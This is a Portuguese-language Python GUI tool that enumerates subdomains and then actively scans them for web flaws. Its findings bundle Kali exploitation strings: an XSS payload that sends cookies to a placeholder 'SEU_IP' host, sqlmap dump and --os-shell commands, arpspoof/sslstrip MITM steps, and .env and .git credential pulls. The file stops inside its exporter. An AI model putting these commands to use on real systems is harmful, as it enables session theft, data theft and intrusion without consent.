#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SubFinder Pro — Enumeração de Subdomínios + Análise de Vulnerabilidades
=======================================================================
- Enumera subdomínios (fontes passivas + DNS + HTTP)
- Analisa vulnerabilidades web (SQLi, XSS, headers, arquivos expostos, TLS)
- Mostra CVE + link, PoC de exploração com ferramentas do Kali Linux e correção
- Exporta relatório HTML completo (subdomínios + vulnerabilidades)

Dependências: pip install requests dnspython urllib3
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import html as html_mod
import requests
import dns.resolver
import socket
import os
import re
import ssl
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================
# MÓDULO DE ENUMERAÇÃO DE SUBDOMÍNIOS
# ============================================================

class SubdomainEnumerator:
    """Motor principal de enumeração de subdomínios otimizado para PCs fracos."""

    def __init__(self, callback=None, progress_callback=None,
                 result_callback=None, api_keys=None):
        self.callback = callback or (lambda msg, tag="": None)
        self.progress_callback = progress_callback or (
            lambda current, total, phase: None
        )
        self.result_callback = result_callback or (
            lambda sub, info: None
        )
        self.found_subdomains = {}
        self.api_keys = api_keys or {}
        self.stop_flag = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36'
            )
        })
        self.session.verify = False
        self.lock = threading.Lock()
        self.sources_completed = 0
        self.total_sources = 0

    def log(self, message, tag="info"):
        if self.callback:
            self.callback(message, tag)

    def add_subdomain(self, subdomain, source):
        if self.stop_flag:
            return False
        subdomain = subdomain.strip().lower()
        subdomain = subdomain.lstrip(".*")
        subdomain = re.sub(r'[^a-zA-Z0-9\.\-]', '', subdomain)
        if not subdomain or len(subdomain) < 3:
            return False
        with self.lock:
            if subdomain not in self.found_subdomains:
                self.found_subdomains[subdomain] = {
                    'source': source, 'ip': '', 'status': '',
                    'timestamp': datetime.now().strftime('%H:%M:%S')
                }
                self.log(f"  [+] {subdomain} [{source}]", "found")
                self.result_callback(
                    subdomain, self.found_subdomains[subdomain]
                )
                return True
        return False

    def mark_source_complete(self):
        with self.lock:
            self.sources_completed += 1
        if self.total_sources > 0:
            self.progress_callback(
                self.sources_completed, self.total_sources, "sources"
            )

    def stop(self):
        self.stop_flag = True
        try:
            self.session.close()
        except Exception:
            pass

    def resolve_domain(self, subdomain):
        if self.stop_flag:
            return ''
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 1.5
            resolver.lifetime = 1.5
            answers = resolver.resolve(subdomain, 'A')
            ips = [str(rdata) for rdata in answers]
            return ips[0] if ips else ''
        except Exception:
            try:
                return socket.gethostbyname(subdomain)
            except Exception:
                return ''

    def check_http_status(self, subdomain):
        if self.stop_flag:
            return ''
        for proto in ['https', 'http']:
            if self.stop_flag:
                return ''
            try:
                r = self.session.get(
                    f"{proto}://{subdomain}",
                    timeout=4, allow_redirects=True
                )
                return str(r.status_code)
            except Exception:
                continue
        return ''

    # ---- FONTES PASSIVAS ----

    def source_crtsh(self, domain):
        source = "crt.sh"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            r = self.session.get(url, timeout=15)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for entry in data:
                    if self.stop_flag: return
                    name_value = entry.get('name_value', '')
                    for sub in name_value.split('\n'):
                        sub = sub.strip()
                        if sub.endswith(domain):
                            if self.add_subdomain(sub, source):
                                count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_hackertarget(self, domain):
        source = "HackerTarget"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
            r = self.session.get(url, timeout=10)
            if r.status_code == 200 and 'error' not in r.text.lower():
                count = 0
                for line in r.text.split('\n'):
                    if self.stop_flag: return
                    parts = line.split(',')
                    if parts and parts[0].strip().endswith(domain):
                        if self.add_subdomain(parts[0].strip(), source):
                            count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_alienvault(self, domain):
        source = "AlienVault"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://otx.alienvault.com/api/v1/indicators/"
                   f"domain/{domain}/passive_dns")
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for entry in data.get('passive_dns', []):
                    if self.stop_flag: return
                    hostname = entry.get('hostname', '')
                    if hostname.endswith(domain):
                        if self.add_subdomain(hostname, source):
                            count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_urlscan(self, domain):
        source = "URLScan"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://urlscan.io/api/v1/search/"
                   f"?q=domain:{domain}&size=1000")
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for result in data.get('results', []):
                    if self.stop_flag: return
                    page = result.get('page', {})
                    hostname = page.get('domain', '')
                    if hostname.endswith(domain):
                        if self.add_subdomain(hostname, source):
                            count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_rapiddns(self, domain):
        source = "RapidDNS"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://rapiddns.io/subdomain/{domain}?full=1"
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                count = 0
                pattern = (r'<td>([a-zA-Z0-9\.\-]+\.'
                           + re.escape(domain) + r')</td>')
                matches = re.findall(pattern, r.text)
                for sub in matches:
                    if self.stop_flag: return
                    if self.add_subdomain(sub, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_webarchive(self, domain):
        source = "WebArchive"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://web.archive.org/cdx/search/cdx?"
                   f"url=*.{domain}/*&output=json&fl=original"
                   f"&collapse=urlkey&limit=5000")
            r = self.session.get(url, timeout=20)
            if r.status_code == 200:
                data = r.json()
                count = 0
                seen = set()
                for entry in data[1:]:
                    if self.stop_flag: return
                    try:
                        parsed = urlparse(entry[0])
                        hostname = parsed.hostname
                        if (hostname and hostname.endswith(domain)
                                and hostname not in seen):
                            seen.add(hostname)
                            if self.add_subdomain(hostname, source):
                                count += 1
                    except Exception:
                        pass
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_anubis(self, domain):
        source = "AnubisDB"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://jldc.me/anubis/subdomains/{domain}"
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for sub in data:
                    if self.stop_flag: return
                    if sub.endswith(domain):
                        if self.add_subdomain(sub, source):
                            count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_certspotter(self, domain):
        source = "CertSpotter"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://api.certspotter.com/v1/issuances?"
                   f"domain={domain}&include_subdomains=true"
                   f"&expand=dns_names")
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for cert in data:
                    if self.stop_flag: return
                    for name in cert.get('dns_names', []):
                        if name.endswith(domain):
                            if self.add_subdomain(name, source):
                                count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_securitytrails(self, domain):
        source = "SecurityTrails"
        api_key = self.api_keys.get('securitytrails', '')
        if not api_key:
            self.mark_source_complete()
            return
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://api.securitytrails.com/v1/domain/"
                   f"{domain}/subdomains")
            headers = {'APIKEY': api_key}
            r = self.session.get(url, headers=headers, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for sub in data.get('subdomains', []):
                    if self.stop_flag: return
                    full = f"{sub}.{domain}"
                    if self.add_subdomain(full, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_virustotal(self, domain):
        source = "VirusTotal"
        api_key = self.api_keys.get('virustotal', '')
        if not api_key:
            self.mark_source_complete()
            return
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://www.virustotal.com/vtapi/v2/domain/report"
                   f"?apikey={api_key}&domain={domain}")
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for sub in data.get('subdomains', []):
                    if self.stop_flag: return
                    if self.add_subdomain(sub, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_shodan(self, domain):
        source = "Shodan"
        api_key = self.api_keys.get('shodan', '')
        if not api_key:
            self.mark_source_complete()
            return
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://api.shodan.io/dns/domain/"
                   f"{domain}?key={api_key}")
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for entry in data.get('subdomains', []):
                    if self.stop_flag: return
                    full = f"{entry}.{domain}"
                    if self.add_subdomain(full, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_digitorus(self, domain):
        source = "Google Dork"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://www.google.com/search?q=site:{domain}&num=100"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
            r = self.session.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                count = 0
                pattern = (r'([a-zA-Z0-9][-a-zA-Z0-9]*\.'
                           + re.escape(domain) + r')')
                matches = set(re.findall(pattern, r.text))
                for sub in matches:
                    if self.stop_flag: return
                    if self.add_subdomain(sub, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_threatminer(self, domain):
        source = "ThreatMiner"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = (f"https://api.threatminer.org/v2/domain.php"
                   f"?q={domain}&rt=5")
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for sub in data.get('results', []):
                    if self.stop_flag: return
                    if sub.endswith(domain):
                        if self.add_subdomain(sub, source):
                            count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_bufferover(self, domain):
        source = "BufferOver"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            url = f"https://dns.bufferover.run/dns?q=.{domain}"
            r = self.session.get(url, timeout=12)
            if r.status_code == 200:
                data = r.json()
                count = 0
                for entry in data.get('FDNS_A', []) or []:
                    if self.stop_flag: return
                    parts = entry.split(',')
                    if len(parts) >= 2:
                        sub = parts[1].strip()
                        if sub.endswith(domain):
                            if self.add_subdomain(sub, source):
                                count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def source_dnsdumpster_api(self, domain):
        source = "DNSDumpster"
        self.log(f"[*] Consultando {source}...", "source")
        try:
            sess = requests.Session()
            r = sess.get('https://dnsdumpster.com/', timeout=8)
            csrf_token = ''
            match = re.search(
                r'csrfmiddlewaretoken.*?value="(.+?)"', r.text
            )
            if match:
                csrf_token = match.group(1)
            cookies = r.cookies
            data = {
                'csrfmiddlewaretoken': csrf_token,
                'targetip': domain, 'user': 'free'
            }
            headers = {
                'Referer': 'https://dnsdumpster.com/',
                'User-Agent': 'Mozilla/5.0'
            }
            r = sess.post(
                'https://dnsdumpster.com/', data=data,
                headers=headers, cookies=cookies, timeout=12
            )
            if r.status_code == 200:
                count = 0
                pattern = (r'([a-zA-Z0-9][-a-zA-Z0-9]*\.'
                           + re.escape(domain) + r')')
                matches = set(re.findall(pattern, r.text))
                for sub in matches:
                    if self.stop_flag: return
                    if self.add_subdomain(sub, source):
                        count += 1
                self.log(f"  [✓] {source}: {count} encontrados", "success")
        except Exception as e:
            if not self.stop_flag:
                self.log(f"  [✗] {source}: {str(e)[:60]}", "error")
        finally:
            self.mark_source_complete()

    def enumerate(self, domain, resolve=True,
                  check_status=False, threads=5):
        """Executa a enumeração completa."""
        self.found_subdomains = {}
        self.stop_flag = False
        self.sources_completed = 0

        self.log("=" * 60, "header")
        self.log("  SubFinder Pro — Enumeração de Subdomínios", "header")
        self.log(f"  Alvo: {domain}", "header")
        self.log(
            f"  Início: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
            "header"
        )
        self.log("=" * 60, "header")
        self.log("", "info")

        sources = [
            self.source_crtsh, self.source_hackertarget,
            self.source_alienvault, self.source_urlscan,
            self.source_rapiddns, self.source_webarchive,
            self.source_anubis, self.source_certspotter,
            self.source_threatminer, self.source_bufferover,
            self.source_dnsdumpster_api, self.source_digitorus,
            self.source_securitytrails,
            self.source_virustotal, self.source_shodan,
        ]

        total_phases = len(sources)
        if resolve:
            total_phases += 1
        if check_status:
            total_phases += 1
        self.total_sources = total_phases

        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = {
                executor.submit(source, domain): source.__name__
                for source in sources
            }
            for future in concurrent.futures.as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    future.result()
                except Exception:
                    pass

        if self.stop_flag:
            self.log("\n[!] Scan cancelado pelo usuário. Consolidando dados obtidos...", "warning")
            return self.found_subdomains

        self.log(f"\n{'=' * 60}", "header")
        self.log(
            f"  Subdomínios únicos: {len(self.found_subdomains)}",
            "header"
        )
        self.log(f"{'=' * 60}", "header")

        # Fase de Resolução de DNS
        if resolve and self.found_subdomains:
            self.log("\n[*] Resolvendo IPs...", "source")
            subs_list = list(self.found_subdomains.keys())
            total_r = len(subs_list)
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=threads
            ) as executor:
                futs = {
                    executor.submit(self.resolve_domain, s): s
                    for s in subs_list
                }
                done = 0
                for future in concurrent.futures.as_completed(futs):
                    if self.stop_flag:
                        break
                    sub = futs[future]
                    try:
                        ip = future.result()
                        self.found_subdomains[sub]['ip'] = ip
                        if ip:
                            self.result_callback(
                                sub, self.found_subdomains[sub]
                            )
                    except Exception:
                        pass
                    done += 1
                    self.progress_callback(done, total_r, "resolve")
                    if done % 10 == 0 or done == total_r:
                        self.log(f"  Resolvidos: {done}/{total_r}", "info")
            self.mark_source_complete()
            self.log("  [✓] DNS concluído", "success")

        if self.stop_flag:
            return self.found_subdomains

        # Fase de Status HTTP
        if check_status and self.found_subdomains:
            self.log("\n[*] Verificando HTTP...", "source")
            active = {
                k: v for k, v in self.found_subdomains.items()
                if v['ip']
            }
            total_c = len(active)
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=threads
            ) as executor:
                futs = {
                    executor.submit(self.check_http_status, s): s
                    for s in active
                }
                done = 0
                for future in concurrent.futures.as_completed(futs):
                    if self.stop_flag:
                        break
                    sub = futs[future]
                    try:
                        status = future.result()
                        self.found_subdomains[sub]['status'] = status
                        if status:
                            self.result_callback(
                                sub, self.found_subdomains[sub]
                            )
                    except Exception:
                        pass
                    done += 1
                    self.progress_callback(done, max(total_c, 1), "http")
                    if done % 10 == 0 or done == total_c:
                        self.log(
                            f"  Verificados: {done}/{total_c}", "info"
                        )
            self.mark_source_complete()
            self.log("  [✓] HTTP concluído", "success")

        self.log(f"\n{'=' * 60}", "header")
        self.log(
            f"  Finalizado: "
            f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
            "header"
        )
        resolved = sum(
            1 for v in self.found_subdomains.values() if v['ip']
        )
        self.log(
            f"  Total: {len(self.found_subdomains)} | "
            f"Com IP: {resolved}",
            "header"
        )
        self.log(f"{'=' * 60}", "header")
        return self.found_subdomains


# ============================================================
# MÓDULO DE ANÁLISE DE VULNERABILIDADES (CVE + Kali Linux)
# ============================================================

class VulnerabilityScanner:
    """Detecta falhas web comuns e retorna CVE, PoC Kali e correção."""

    SENSITIVE_PATHS = [
        ('/.git/config', 'Repositório Git exposto', 'HIGH', 'CWE-538',
         'https://cwe.mitre.org/data/definitions/538.html'),
        ('/.env', 'Arquivo .env com credenciais exposto', 'CRITICAL', 'CWE-798',
         'https://cwe.mitre.org/data/definitions/798.html'),
        ('/backup.zip', 'Backup do site exposto', 'HIGH', 'CWE-538',
         'https://cwe.mitre.org/data/definitions/538.html'),
        ('/phpinfo.php', 'phpinfo() exposto', 'MEDIUM', 'CWE-200',
         'https://cwe.mitre.org/data/definitions/200.html'),
        ('/admin/', 'Painel administrativo exposto', 'MEDIUM', 'CWE-425',
         'https://cwe.mitre.org/data/definitions/425.html'),
        ('/wp-config.php.bak', 'Backup de wp-config exposto', 'CRITICAL', 'CWE-540',
         'https://cwe.mitre.org/data/definitions/540.html'),
        ('/server-status', 'Apache server-status exposto', 'MEDIUM', 'CWE-200',
         'https://cwe.mitre.org/data/definitions/200.html'),
        ('/.DS_Store', 'Arquivo .DS_Store exposto', 'LOW', 'CWE-538',
         'https://cwe.mitre.org/data/definitions/538.html'),
        ('/composer.json', 'composer.json exposto', 'LOW', 'CWE-200',
         'https://cwe.mitre.org/data/definitions/200.html'),
    ]

    def __init__(self, callback=None, vuln_callback=None):
        self.callback = callback or (lambda msg, tag="": None)
        self.vuln_callback = vuln_callback or (lambda host, v: None)
        self.stop_flag = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36'
        })
        self.session.verify = False
        self.lock = threading.Lock()

    def log(self, msg, tag="info"):
        self.callback(msg, tag)

    def stop(self):
        self.stop_flag = True
        try:
            self.session.close()
        except Exception:
            pass

    # ---------- CHECKS ----------

    def check_security_headers(self, url):
        vulns = []
        try:
            r = self.session.get(url, timeout=6)
            h = {k.lower(): v for k, v in r.headers.items()}

            if ('x-frame-options' not in h and
                    'frame-ancestors' not in h.get('content-security-policy', '')):
                vulns.append({
                    'name': 'Clickjacking (X-Frame-Options ausente)',
                    'severity': 'MEDIUM', 'cve': 'CWE-1021',
                    'cve_url': 'https://cwe.mitre.org/data/definitions/1021.html',
                    'cwe': 'CWE-1021',
                    'evidence': f"Sem X-Frame-Options em {url}",
                    'kali': ("Explorar (Burp Suite / navegador, Kali):\n"
                             "1) burpsuite &   # capturar resposta e confirmar ausência\n"
                             f"2) Criar exploit.html:\n"
                             f"   <iframe src='{url}' style='opacity:0' "
                             f"width=800 height=600></iframe>\n"
                             "   Vítima clica em conteúdo invisível (clickjacking)."),
                    'fix': "X-Frame-Options: DENY ou CSP frame-ancestors 'none'"
                })
            if 'content-security-policy' not in h:
                vulns.append({
                    'name': 'Content-Security-Policy ausente',
                    'severity': 'MEDIUM', 'cve': 'CWE-693',
                    'cve_url': 'https://cwe.mitre.org/data/definitions/693.html',
                    'cwe': 'CWE-693',
                    'evidence': f"Sem CSP em {url}",
                    'kali': ("Explorar combinando com XSS:\n"
                             f"  {url}?q=<script>alert(document.cookie)</script>\n"
                             "Ferramentas Kali:\n"
                             "  dalfox url <URL>\n"
                             "  xsser --url <URL> --auto"),
                    'fix': ("Content-Security-Policy: default-src 'self'; "
                            "script-src 'self'")
                })
            if 'x-content-type-options' not in h:
                vulns.append({
                    'name': 'MIME Sniffing (X-Content-Type-Options ausente)',
                    'severity': 'LOW', 'cve': 'CWE-430',
                    'cve_url': 'https://cwe.mitre.org/data/definitions/430.html',
                    'cwe': 'CWE-430',
                    'evidence': f"Sem X-Content-Type-Options em {url}",
                    'kali': ("Upload de arquivo .html servido como text/plain pode "
                             "ser executado pelo navegador (stored XSS via upload)."),
                    'fix': "X-Content-Type-Options: nosniff"
                })
            if 'strict-transport-security' not in h and url.startswith('https'):
                vulns.append({
                    'name': 'HSTS ausente (SSL-strip possível)',
                    'severity': 'LOW', 'cve': 'CVE-2011-3389',
                    'cve_url': 'https://nvd.nist.gov/vuln/detail/CVE-2011-3389',
                    'cwe': 'CWE-319',
                    'evidence': f"HTTPS sem HSTS em {url}",
                    'kali': ("MITM com sslstrip (Kali):\n"
                             "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
                             "  arpspoof -i eth0 -t <IP_VITIMA> <IP_GATEWAY>\n"
                             "  sslstrip -l 8080"),
                    'fix': ("Strict-Transport-Security: max-age=31536000; "
                            "includeSubDomains; preload")
                })
            server = h.get('server', '')
            if server and re.search(r'\d+\.\d+', server):
                vulns.append({
                    'name': f'Versão do servidor exposta ({server})',
                    'severity': 'INFO', 'cve': 'CWE-200',
                    'cve_url': 'https://cwe.mitre.org/data/definitions/200.html',
                    'cwe': 'CWE-200',
                    'evidence': f"Header Server: {server}",
                    'kali': ("Buscar exploits para a versão (Kali):\n"
                             f"  searchsploit {server.split('/')[0]}\n"
                             f"  nmap -sV --script vulners <IP>"),
                    'fix': "Ocultar versão (server_tokens off / ServerTokens Prod)"
                })
        except Exception:
            pass
        return vulns

    def check_xss_reflected(self, url):
        vulns = []
        if not urlparse(url).query:
            return vulns
        marker = 'sfx9xmark'
        try:
            parsed = urlparse(url)
            for key in [p.split('=')[0] for p in parsed.query.split('&')
                        if '=' in p]:
                if self.stop_flag:
                    break
                payload = f"{marker}<script>alert(1)</script>"
                test_url = url.replace(f"{key}=", f"{key}={payload}", 1)
                r = self.session.get(test_url, timeout=6)
                if f"{marker}<script>alert(1)</script>" in r.text:
                    vulns.append({
                        'name': f'XSS Refletido no parâmetro "{key}"',
                        'severity': 'HIGH', 'cve': 'CWE-79',
                        'cve_url': 'https://nvd.nist.gov/vuln-search?query=CWE-79',
                        'cwe': 'CWE-79',
                        'evidence': f"Payload refletido sem encoding: "
                                    f"{test_url[:120]}",
                        'kali': ("Explorar com ferramentas do Kali:\n"
                                 f"  dalfox url \"{test_url}\"\n"
                                 f"  xsser --url \"{url}\" -p {key} --auto\n"
                                 "Roubo de cookie (PoC):\n"
                                 f"  ?{key}=<script>location="
                                 f"'http://SEU_IP/'+document.cookie</script>"),
                        'fix': ("html.escape() na saída, validação allowlist "
                                "de entrada e CSP.")
                    })
                    break
        except Exception:
            pass
        return vulns

    def check_sqli_error(self, url):
        vulns = []
        if not urlparse(url).query:
            return vulns
        errors = [
            (r"you have an error in your sql syntax", "MySQL"),
            (r"unclosed quotation mark after", "MSSQL"),
            (r"quoted string not properly terminated", "Oracle"),
            (r"pg_query|postgresql", "PostgreSQL"),
            (r"sqlite_master|sqlite3", "SQLite"),
        ]
        try:
            parsed = urlparse(url)
            for key in [p.split('=')[0] for p in parsed.query.split('&')
                        if '=' in p]:
                if self.stop_flag:
                    break
                if not re.match(
                        r'^(id|page|cat|item|user|product|no|num|cod|codigo|'
                        r'q|search)$', key, re.I):
                    continue
                test_url = url.replace(f"{key}=", f"{key}='", 1)
                r = self.session.get(test_url, timeout=6)
                body = r.text[:30000].lower()
                for pattern, db in errors:
                    if re.search(pattern, body):
                        vulns.append({
                            'name': f'SQL Injection no parâmetro '
                                    f'"{key}" ({db})',
                            'severity': 'CRITICAL', 'cve': 'CWE-89',
                            'cve_url': 'https://nvd.nist.gov/vuln-search?query=CWE-89',
                            'cwe': 'CWE-89',
                            'evidence': f"Erro de SQL exposto ao injetar "
                                        f"apóstrofo em {key}",
                            'kali': ("Explorar com sqlmap (pré-instalado no Kali):\n"
                                     f"  sqlmap -u \"{url}\" -p {key} "
                                     f"--batch --dbs\n"
                                     f"  sqlmap -u \"{url}\" -p {key} --batch -D <db> --tables\n"
                                     f"  sqlmap -u \"{url}\" -p {key} --batch --dump\n"
                                     "Shell interativo (se privilégios):\n"
                                     f"  sqlmap -u \"{url}\" -p {key} --os-shell"),
                            'fix': ("Prepared statements / ORM, validação de "
                                    "entrada e ocultar erros SQL do usuário.")
                        })
                        break
        except Exception:
            pass
        return vulns

    def check_sensitive_files(self, url):
        vulns = []
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        for path, desc, sev, cwe, cve_url in self.SENSITIVE_PATHS:
            if self.stop_flag:
                break
            try:
                r = self.session.get(base + path, timeout=5,
                                     allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 20:
                    if path == '/.git/config' and '[core]' not in r.text:
                        continue
                    if path == '/.env' and '=' not in r.text:
                        continue
                    kali_cmd = {
                        '/.git/config': (
                            f"git-dumper {base}/.git/ ./dump/\n"
                            "  git -C ./dump log --all\n"
                            "  (código-fonte completo recuperável)"),
                        '/.env': (
                            f"curl -s {base}/.env\n"
                            "  Credenciais de banco/API podem dar acesso direto:\n"
                            "  mysql -h <host> -u user -p"),
                    }.get(path, f"curl -s {base}{path}")
                    vulns.append({
                        'name': f'{desc} ({path})',
                        'severity': sev, 'cve': cwe,
                        'cve_url': cve_url, 'cwe': cwe,
                        'evidence': f"HTTP 200 em {base}{path} "
                                    f"({len(r.text)} bytes)",
                        'kali': kali_cmd,
                        'fix': ("Bloquear acesso no servidor web "
                                "(location / FilesMatch) e remover arquivos "
                                "do deploy.")
                    })
            except Exception:
                continue
        return vulns

    def check_directory_listing(self, url):
        try:
            r = self.session.get(url, timeout=6)
            if re.search(r'<title>Index of /', r.text, re.I):
                return [{
                    'name': 'Directory Listing habilitado',
                    'severity': 'LOW', 'cve': 'CWE-548',
                    'cve_url': 'https://cwe.mitre.org/data/definitions/548.html',
                    'cwe': 'CWE-548',
                    'evidence': f"Listagem de diretório em {url}",
                    'kali': (f"Recursivamente baixar tudo (Kali):\n"
                             f"  wget -r -np {url}\n"
                             f"  dirb {url}"),
                    'fix': ("Options -Indexes (Apache) / autoindex off (Nginx)")
                }]
        except Exception:
            pass
        return []

    def check_tls(self, host):
        vulns = []
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as s:
                    proto = s.version()
                    if proto in ('TLSv1', 'TLSv1.1'):
                        vulns.append({
                            'name': f'Protocolo TLS obsoleto ({proto})',
                            'severity': 'MEDIUM', 'cve': 'CVE-2014-3566',
                            'cve_url': 'https://nvd.nist.gov/vuln/detail/CVE-2014-3566',
                            'cwe': 'CWE-327',
                            'evidence': f"Servidor aceita {proto}",
                            'kali': (f"Confirmar com sslscan (Kali):\n"
                                     f"  sslscan {host}\n"
                                     f"  nmap --script ssl-enum-ciphers "
                                     f"-p 443 {host}"),
                            'fix': "Habilitar apenas TLSv1.2 e TLSv1.3."
                        })
        except Exception:
            pass
        return vulns

    # ---------- ORQUESTRAÇÃO ----------

    def scan_host(self, host, ip=''):
        base_url = ''
        for proto in ['https', 'http']:
            try:
                r = self.session.get(f"{proto}://{host}", timeout=6,
                                     allow_redirects=True)
                base_url = r.url
                break
            except Exception:
                continue
        if not base_url:
            return []

        self.log(f"  [*] Analisando {host}...", "source")
        found = []
        found += self.check_security_headers(base_url)
        found += self.check_xss_reflected(base_url)
        found += self.check_sqli_error(base_url)
        found += self.check_sensitive_files(base_url)
        found += self.check_directory_listing(base_url)
        if base_url.startswith('https'):
            found += self.check_tls(host)

        with self.lock:
            for v in found:
                v['host'] = host
                self.log(f"    [!] [{v['severity']}] {v['name']}", "vuln")
                self.vuln_callback(host, v)
        return found

    def scan_all(self, subdomains, threads=5):
        self.stop_flag = False
        targets = [s for s, info in subdomains.items() if info.get('ip')]
        all_vulns = []
        self.log(f"\n[*] Analisando {len(targets)} hosts ativos...", "header")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(self.scan_host, s): s for s in targets}
            done = 0
            for f in concurrent.futures.as_completed(futs):
                if self.stop_flag:
                    break
                try:
                    all_vulns.extend(f.result())
                except Exception:
                    pass
                done += 1
                self.log(f"  Progresso: {done}/{len(targets)}", "info")
        return all_vulns


# ============================================================
# MÓDULO DE EXPORTAÇÃO
# ============================================================

class Exporter:

    @staticmethod
    def save_txt(subdomains, filepath, domain):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write("# SubFinder Pro - Resultados\n")
            f.write(f"# Domínio: {domain}\n")
            f.write(f"# Data: "
                    f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
